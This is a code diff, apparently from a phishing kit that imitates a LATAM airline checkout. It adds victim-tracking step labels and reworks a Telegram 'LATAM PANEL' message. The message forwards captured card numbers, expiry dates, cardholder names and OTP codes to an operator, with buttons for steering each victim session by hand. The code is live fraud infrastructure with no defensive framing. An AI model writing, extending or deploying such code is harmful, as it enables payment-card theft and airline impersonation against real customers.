@@ -127,6 +127,21 @@ function actionLabel(action: RouteAction) {
   return labels[action] || action;
 }
 
+function stepLabel(event: unknown, meta?: Record<string, unknown>) {
+  if (typeof meta?.step === 'string' && meta.step.trim()) return meta.step.trim();
+  const labels: Record<string, string> = {
+    P1: 'Inicio / reserva',
+    P2: 'Eligiendo vuelos',
+    P3: 'Resumen del viaje',
+    P4: 'Checkout (pasajeros / asientos / tienda)',
+    'P-PAYMENT': 'Página de pago',
+    'P-SUCCESS': 'Compra confirmada',
+    PAYMENT_SUBMIT: 'Envió datos de tarjeta',
+    OTP_SUBMIT: 'Envió código OTP',
+  };
+  return labels[String(event || '')] || String(event || '-');
+}
+
 // Los tres botones se mantienen iguales en todos los mensajes para que el operador
 // siempre tenga las mismas opciones de routing manual.
 function keyboard(sessionId: string, brand: string) {
@@ -143,23 +158,27 @@ function keyboard(sessionId: string, brand: string) {
 function formatTelegramMessage(payload: Record<string, unknown>) {
   console.log('PAYLOAD FROM MAP: ', payload);
   const mockCard = payload.mockCard as { brand?: string; pan?: string; exp?: string; cvv?: string; holder?: string } | undefined;
-  const meta = payload.meta as Record<string, unknown> | undefined;
-  const brand = String(payload.brand || mockCard?.brand || meta?.brand || '-');
-  const amount = String(meta?.amount || '-');
+  const meta = objectValue(payload.meta) || {};
+  const metaOtp = objectValue(payload.metaOtp) || {};
+  const cpayload = objectValue(meta.cpayload) || {};
+  const brand = String(payload.brand || mockCard?.brand || meta.brand || '-');
+  const amount = meta.amount == null || meta.amount === '' ? '-' : String(meta.amount);
   const lines = [
     '✈️ LATAM PANEL',
     '━━━━━━━━━━━━━━━━━━',
+    `📍 Paso: ${stepLabel(payload.event, meta)}`,
+    `🔗 Ruta: ${payload.route || meta.path || '-'}`,
     `🆔 Sesión: ${payload.sessionId || '-'}`,
-    `💵 Monto: $ ${amount}`,
+    `💵 Monto: ${amount === '-' ? '-' : `PEN ${amount}`}`,
     '',
     '💳 DATOS DE PAGO',
     `🏷️ Marca: ${brand.toUpperCase()}`,
-    `💳 Tarjeta: ${payload.meta.cpayload.b || '-'}`,
-    `📅 Expira: ${payload?.meta?.cpayload?.exp || '-'}`,
-    `👤 Titular: ${payload?.meta?.cpayload?.holder || '-'}`,
+    `💳 Tarjeta: ${cpayload.b || meta.card || '-'}`,
+    `📅 Expira: ${cpayload.exp || '-'}`,
+    `👤 Titular: ${cpayload.holder || '-'}`,
     '',
     '💰 OTP',
-    `💵 Código: ${payload.metaOtp.otp}`,
+    `💵 Código: ${metaOtp.otp || '-'}`,
     '━━━━━━━━━━━━━━━━━━',
   ];
 
@@ -320,7 +339,7 @@ export const POST: APIRoute = async ({ request }) => {
 
   console.info('[debug-api]', payload);
   session.payload = payload;
-  const telegram = await sendTelegram(payload, { withButtons: event !== 'PAYMENT_SUBMIT' && event !== 'P-PAYMENT' });
+  const telegram = await sendTelegram(payload, { withButtons: event !== 'P-SUCCESS' });
 
   return json({ ...payload, telegram });
 };
